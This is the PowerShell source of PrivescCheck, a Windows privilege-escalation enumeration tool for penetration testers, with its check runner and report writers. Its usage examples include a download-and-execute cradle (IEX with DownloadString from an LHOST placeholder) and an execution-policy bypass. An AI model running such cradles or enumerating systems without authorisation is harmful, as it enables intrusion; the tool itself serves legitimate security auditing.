function Invoke-PrivescCheck {
    <#
    .SYNOPSIS
    Enumerates common security misconfigurations that can be exploited for privilege escalation purposes.

    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION
    This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.

    .PARAMETER Extended
    Set this flag to enable extended checks.

    .PARAMETER Audit
    Set this flag to enabled audit checks.

    .PARAMETER Experimental
    Set this flag to enable experimental checks.

    .PARAMETER Risky
    Set this flag to enable risky checks that could trigger an EDR detection.

    .PARAMETER Force
    Set this flag to ignore warnings.

    .PARAMETER Silent
    Don't output test results, show only the final vulnerability report.

    .PARAMETER Report
    The base name of the output file report(s) (extension is appended automatically depending on the chosen file format(s)).

    .PARAMETER Format
    A comma-separated list of file formats (TXT,HTML,CSV,XML).

    .EXAMPLE
    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

    .EXAMPLE
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
    #>

    [CmdletBinding()]
    param(
        [switch] $Extended = $false,
        [switch] $Audit = $false,
        [switch] $Experimental = $false,
        [switch] $Risky = $false,
        [switch] $Force = $false,
        [switch] $Silent = $false,
        [string] $Report,
        [ValidateSet("TXT","HTML","CSV","XML")]
        [string[]] $Format
    )

    begin {
        # Check whether the current process has admin privileges.
        # The following check was taken from PowerUp.ps1
        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if ($IsAdmin) {
            if (-not $Force) {
                Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled. You can specify the '-Force' option to disable this warning message."
                Start-Sleep -Seconds 10
            }
        }

        # Reset global variables.
        foreach ($VariableEntry in $($script:GlobalVariable.Keys)) {
            $script:GlobalVariable.$VariableEntry = $null
        }

        # Reset global cache.
        foreach ($CacheEntryName in $($script:GlobalCache.Keys)) {
            $script:GlobalCache.$CacheEntryName = $null
        }

        # Once the cache is fully initialized, we can build an InitialSessionState
        # object that we can use in different runspaces.
        $script:GlobalVariable.InitialSessionState = New-InitialSessionState

        $script:GlobalVariable.CheckResultList = @()
        $AllChecks = New-Object System.Collections.ArrayList

        # Create a StopWatch object to measure the time take by each check.
        $StopWatch = [Diagnostics.StopWatch]::StartNew()
        $StopWatch.Stop()
    }

    process {

        ConvertFrom-EmbeddedTextBlob -TextBlob $script:GlobalConstant.CheckCsvBlob | ConvertFrom-Csv | ForEach-Object {
            [void] $AllChecks.Add($_)
        }

        $CheckCounter = 0
        foreach ($Check in $AllChecks) {

            $CheckCounter += 1

            # Run the check only if the user wants it.
            $IgnoreCheck = $true
            switch ($Check.Type) {
                "Base" { $IgnoreCheck = $false }
                "Extended" { if ($Extended) { $IgnoreCheck = $false }}
                "Audit" { if ($Audit) { $IgnoreCheck = $false }}
                "Experimental" { if ($Experimental) { $IgnoreCheck = $false }}
                default {
                    throw "Unhandled check type for '$($Check.Id)': $($Check.Type)"
                }
            }

            if ($IgnoreCheck) { continue }

            # If the current user is an admin but the check's 'RunIfAdmin' flag was not set to true, ignore it.
            if ($IsAdmin -and (-not [System.Convert]::ToBoolean($Check.RunIfAdmin))) {
                Write-Warning "Check '$($Check.DisplayName)' won't give proper results when run as an administrator, ignoring..."
                continue
            }

            # If the check is "risky", but the option -Risky was not specified, ignore it.
            if ([System.Convert]::ToBoolean($Check.Risky) -and (-not $Risky)) {
                Write-Warning "Check '$($Check.DisplayName)' is categorized as risky, but the option '-Risky' was not specified, ignoring..."
                continue
            }

            if (-not $Silent) { Write-CheckBanner -Check $Check }

            # Set the default base severity level of the check based on the information stored in the input
            # CSV file.
            $BaseSeverity = $Check.Severity -as $script:SeverityLevel
            $Check | Add-Member -MemberType "NoteProperty" -Name "BaseSeverity" -Value $BaseSeverity

            # Reset and start the StopWatch.
            $StopWatch.Reset()
            $StopWatch.Start()

            # Run the check.
            $CheckResult = Invoke-Check -Check $Check
            $CheckResult.Severity = $CheckResult.Severity -as $script:SeverityLevel

            # Stop the StopWatch and add the elapsed time object as a new property to the check result.
            $StopWatch.Stop()
            $CheckResult | Add-Member -MemberType "NoteProperty" -Name "TimeElapsed" -Value $StopWatch.Elapsed

            if (-not $Silent) {
                # If the 'Silent' option was not specified, print a banner that shows some information about the
                # current check. Then, run the check and print the output either as a table or a list, depending on
                # the 'Format' value in the CSV data.
                Write-CheckResult -CheckResult $CheckResult
            }
            else {
                # If the 'Silent' option was specified, don't print the output of the check but write a progress bar
                # and show the name of the check which is being run. Note: if we are not running in a console window
                # Write-Progress will fail, so use Write-Output to print the completion percentage instead.
                $Completion = [UInt32](($CheckCounter * 100) / ($AllChecks.Count))

                if (Test-IsRunningInConsole) {
                    Write-Progress -Activity "$($Check.Category.ToUpper()) > $($Check.DisplayName)" -Status "Progress: $($Completion)%" -PercentComplete $Completion
                }
                else {
                    Write-Output "[$($Completion)%] $($Check.Category.ToUpper()) > $($Check.DisplayName)"
                }
            }
        }

        # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore,
        # this will be only visible if run from a 'real' terminal.
        # Show-PrivescCheckAsciiReport
        Write-ShortReport

        # If the 'Report' option was specified, write a report to a file using the value of this parameter
        # as the basename (or path + basename). The extension is then determined based on the chosen
        # format(s).
        if ($Report) {

            if (-not $Format) {
                # If a format or a format list was not specified, default to the TXT format.
                [string[]] $Format = "TXT"
            }

            $Format | ForEach-Object {
                # For each format, build the name of the output report file as BASENAME + . + EXT. Then generate the
                # report corresponding to the current format and write it to a file using the previously formatted
                # filename.
                $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
                switch ($_) {
                    "TXT"   { Write-TxtReport  -AllResults $script:GlobalVariable.CheckResultList | Out-File $ReportFileName }
                    "HTML"  { Write-HtmlReport -AllResults $script:GlobalVariable.CheckResultList | Out-File $ReportFileName }
                    "CSV"   { Write-CsvReport  -AllResults $script:GlobalVariable.CheckResultList | Out-File $ReportFileName }
                    "XML"   { Write-XmlReport  -AllResults $script:GlobalVariable.CheckResultList | Out-File $ReportFileName }
                    default { Write-Warning "`nReport format not implemented: $($Format.ToUpper())`n" }
                }
            }
        }
    }

    end {
        # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter
        # was specified.
        if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
            Write-Warning "To get more info, run this script with the option '-Extended'."
        }
    }
}

function ConvertFrom-EmbeddedTextBlob {
    param([String] $TextBlob)
    $Decoded = [System.Convert]::FromBase64String($TextBlob)
    ConvertFrom-Gzip -Bytes $Decoded
}

function Invoke-DynamicCommand {

    [CmdletBinding()]
    param(
        [string] $Command
    )

    process {
        $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Command)
        . $ScriptBlock
    }
}

function Invoke-Check {

    [CmdletBinding()]
    param(
        [object] $Check
    )

    $Check.Severity = $Check.Severity -as $script:SeverityLevel
    $IsVulnerabilityCheck = $Check.Severity -ne $script:SeverityLevel::None

    if ($IsVulnerabilityCheck) {
        $Result = Invoke-DynamicCommand -Command "$($Check.Command) -BaseSeverity $([UInt32] $Check.BaseSeverity)"
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result.Result
        if ($Check.Severity) { $Check.Severity = $Result.Severity }
    }
    else {
        $Result = Invoke-DynamicCommand -Command "$($Check.Command)"
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
    }

    if ($Check.Format -eq "Table") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Check.ResultRaw | Format-Table | Out-String)
    }
    elseif ($Check.Format -eq "List") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Check.ResultRaw | Format-List | Out-String)
    }

    $script:GlobalVariable.CheckResultList += $Check
    $Check
}

function Write-CheckBanner {

    [OutputType([string])]
    [CmdletBinding()]
    param(
        [object] $Check,
        [switch] $Ascii
    )

    function Split-Description {
        param([string] $Description)

        $DescriptionSplit = New-Object System.Collections.ArrayList
        $TempOld = ""
        $TempNew = ""
        $Description.Split(' ') | ForEach-Object {

            $TempNew = "$($TempOld) $($_)".Trim()
            if ($TempNew.Length -gt 60) {
                [void] $DescriptionSplit.Add($TempOld)
                $TempOld = "$($_)"
            }
            else {
                $TempOld = $TempNew
            }
        }
        if ($TempOld) {
            [void] $DescriptionSplit.Add($TempOld)
        }
        $DescriptionSplit
    }

    $HeavyVertical =          [char] $(if ($Ascii) { '|' } else { 0x2503 })
    $HeavyHorizontal =        [char] $(if ($Ascii) { '-' } else { 0x2501 })
    $HeavyVerticalAndRight =  [char] $(if ($Ascii) { '+' } else { 0x2523 })
    $HeavyVerticalAndLeft =   [char] $(if ($Ascii) { '+' } else { 0x252B })
    $HeavyDownAndHorizontal = [char] $(if ($Ascii) { '+' } else { 0x2533 })
    $HeavyUpAndHorizontal =   [char] $(if ($Ascii) { '+' } else { 0x253B })
    $HeavyDownAndLeft =       [char] $(if ($Ascii) { '+' } else { 0x2513 })
    $HeavyDownAndRight =      [char] $(if ($Ascii) { '+' } else { 0x250F })
    $HeavyUpAndRight =        [char] $(if ($Ascii) { '+' } else { 0x2517 })
    $HeavyUpAndLeft =         [char] $(if ($Ascii) { '+' } else { 0x251B })

    $Result = ""
    $Result += "$($HeavyDownAndRight)$("$HeavyHorizontal" * 10)$($HeavyDownAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyDownAndLeft)`n"
    $Result += "$($HeavyVertical) CATEGORY $($HeavyVertical) $($Check.Category)$(' ' * (49 - $Check.Category.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) TYPE     $($HeavyVertical) $($Check.Type)$(' ' * (49 - $Check.Type.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
    Split-Description -Description $Check.Description | ForEach-Object {
        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String] $_).Length)) $($HeavyVertical)`n"
    }
    $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
    $Result
}

function Write-CheckResult {

    [OutputType([string])]
    [CmdletBinding()]
    param(
        [Object] $CheckResult
    )

    begin {
        $ResultOutput = ""
        $IsVulnerabilityCheck = $CheckResult.BaseSeverity -ne $script:SeverityLevel::None
        $Severity = $(if ($CheckResult.Severity) { $CheckResult.Severity} else { $script:SeverityLevel::None }) -as $script:SeverityLevel
    }

    process {
        # Show the raw output of the check first.
        switch ($CheckResult.Format) {
            "Table"     { $ResultOutput += $CheckResult.ResultRaw | Format-Table -AutoSize | Out-String }
            "List"      { $ResultOutput += $CheckResult.ResultRaw | Format-List | Out-String }
            default     { throw "Unknown output format: $($CheckResult.Format)" }
        }

        # Then show a status message.
        $ResultOutput += "[*] Status:"

        if ($Severity -eq $script:SeverityLevel::None) {
            $ResultOutput += " Informational"
            if ($IsVulnerabilityCheck) {
                $ResultOutput += " (not vulnerable)"
            }
            else {
                if (-not $CheckResult.ResultRaw) {
                    $ResultOutput += " (nothing found)"
                }
            }
        }
        else {
            $ResultOutput += " Vulnerable"
        }

        $ResultOutput += " - Severity: $($Severity) - Execution time: $($CheckResult.TimeElapsed.ToString("hh\:mm\:ss\.fff"))"
        $ResultOutput += "`n`n"

        $ResultOutput
    }
}

function Write-TxtReport {

    [CmdletBinding()]
    param(
        [object[]] $AllResults
    )

    $AllResults | ForEach-Object {
        Write-CheckBanner -Check $_ -Ascii
        Write-CheckResult -CheckResult $_
    }
}

function Write-CsvReport {

    [CmdletBinding()]
    param(
        [object[]] $AllResults
    )

    $AllResults | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Severity,ResultRawString | ConvertTo-Csv -NoTypeInformation
}

function Write-XmlReport {
    <#
    .NOTES
    According to the XML specification, some characters are invalid. The raw result of a check ("ResultRawString") may contain such characters. Therefore, this result must be sanitized before calling "ConvertTo-Xml". The method used here was taken from a solution that was posted on StackOverflow.

    .LINK
    https://github.com/itm4n/PrivescCheck/issues/24
    https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
    #>

    [CmdletBinding()]
    param(
        [object[]] $AllResults
    )

    $AuthorizedXmlCharactersRegex = "[^\x09\x0A\x0D\x20-\xD7FF\xE000-\xFFFD\x10000\x10FFFF]"
    $AllResults | ForEach-Object {
        $_.ResultRawString = [System.Text.RegularExpressions.Regex]::Replace($_.ResultRawString, $AuthorizedXmlCharactersRegex, "")
        $_
    } | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Severity,ResultRawString | ConvertTo-Xml -As String
}

function Write-HtmlReport {

    [OutputType([string])]
    [CmdletBinding()]
    param(
        [object[]] $AllResults
    )

    $JavaScript = @"
var cells = document.getElementsByTagName('td');

for (var i = 0; i < cells.length; i++) {
    var bg_color = null;
    var bg_color_row = null;
    if (cells[i].innerHTML == "Low") {
        bg_color = "bg_blue";
        bg_color_row = "bg_blue_light";
    } else if (cells[i].innerHTML == "Medium") {
        bg_color = "bg_orange";
        bg_color_row = "bg_orange_light";
    } else if (cells[i].innerHTML == "High") {
        bg_color = "bg_red";
        bg_color_row = "bg_red_light";
    } else if (cells[i].innerHTML == "None") {
        bg_color = "bg_grey";
        bg_color_row = "bg_grey_light";
    }

    if (bg_color) {
        if (bg_color_row) { cells[i].parentElement.classList.add(bg_color_row); }
        cells[i].innerHTML = "<span class=\"label " + bg_color + "\">" + cells[i].innerHTML + "</span>";
    }

    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
    // it scrollable.
    cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
}
"@

    $Css = @"
body {
    font: 1.2em normal Arial,sans-serif;
}

table {
    border-collapse: collapse;
    width: 100%;
}

th {
    color: white;
    background: grey;
    text-align: center;
    padding: 5px 0;
}

tr {
    border: 6px solid white;
}

td {
    text-align: center;
    padding: 5px 5px 5px 5px;
    max-width: 800px;
}

tbody td:nth-child(3) {
    text-align: left;
}

/* Render output results with 'pre' style */
tbody td:nth-child(5) {
    white-space: pre;
    margin: 1em 0px;
    padding: .2rem .4rem;
    font-size: 87.5%;
    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
    text-align: left;
}

.scroll {
    max-height: 200px;
    max-width: 800px;
    overflow: auto;
}

.label {
    color: white;
    margin: 8px;
    padding: 6px;
    display: block;
    width: 60px;
    border-radius: 4px;
    font-weight: bold;
}

.bg_green { background-color: green; }
.bg_blue { background-color: royalblue; }
.bg_orange { background-color: orange; }
.bg_red { background-color: red; }
.bg_grey { background-color: grey; }
.bg_blue_light { background-color: #eaf7ff; }
.bg_orange_light { background-color: #fff7ea; }
.bg_red_light { background-color: #ffeaea; }
.bg_grey_light { background-color: #f8f8f8; }
"@

    $Html = @"
<html lang="en-US">
<title>PrivescCheck Report</title>
<head>
<style>
$($Css)
</style>
</head>
<body>
BODY_TO_REPLACE
<script>
$($JavaScript)
</script>
</body>
</html>
"@

    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Severity","ResultRawString" -Fragment
    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
    $Html
}

function Get-SeverityColor {

    param (
        [UInt32] $Severity
    )

    switch ($Severity -as $script:SeverityLevel) {
        $script:SeverityLevel::Low    { "DarkCyan" }
        $script:SeverityLevel::Medium { "DarkYellow" }
        $script:SeverityLevel::High   { "Red" }
        default { Write-Warning "Get-SeverityColor > Unhandled severity level: $($Severity)" }
    }
}

function Write-ShortReport {

    [CmdletBinding()]
    param()

    $HeavyVertical = [char] 0x2503
    # $HeavyVerticalAndRight = [char] 0x2523
    # $HeavyVerticalAndLeft = [char] 0x252B
    $HeavyHorizontal = [char] 0x2501
    # $HeavyDownAndHorizontal = [char] 0x2533
    # $HeavyUpAndHorizontal = [char] 0x253B
    $HeavyDownAndLeft = [char] 0x2513
    $HeavyDownAndRight = [char] 0x250F
    $HeavyUpAndRight = [char] 0x2517
    $HeavyUpAndLeft = [char] 0x251B
    $RightwardsArrow = [char] 0x2192

    Write-Host -ForegroundColor White "$($HeavyDownAndRight)$("$HeavyHorizontal" * 62)$($HeavyDownAndLeft)"
    Write-Host -ForegroundColor White "$($HeavyVertical)$(" " * 17)~~~ PrivescCheck Summary ~~~$(" " * 17)$($HeavyVertical)"
    Write-Host -ForegroundColor White "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"

    # Show only vulnerabilities, i.e. any finding that has a final severity of at
    # least "low".
    $AllVulnerabilities = $script:GlobalVariable.CheckResultList | Where-Object { $_.Severity -ne $script:SeverityLevel::None }
    $Categories = $AllVulnerabilities | Select-Object -ExpandProperty "Category" | Sort-Object -Unique

    if ($null -eq $AllVulnerabilities) {
        Write-Host -ForegroundColor White "No vulnerability found!"
        return
    }

    foreach ($Category in $Categories) {

        $Vulnerabilities = $AllVulnerabilities | Where-Object { $_.Category -eq $Category }

        Write-Host -ForegroundColor White " $($Category)"

        foreach ($Vulnerability in $Vulnerabilities) {

            $SeverityColor = Get-SeverityColor -Severity $($Vulnerability.Severity -as $script:SeverityLevel)

            Write-Host -NoNewline -ForegroundColor White " -"
            Write-Host -NoNewLine " $($Vulnerability.DisplayName) $($RightwardsArrow)"
            Write-Host -ForegroundColor $SeverityColor " $($Vulnerability.Severity -as $script:SeverityLevel)"
        }
    }

    Write-Host ""
}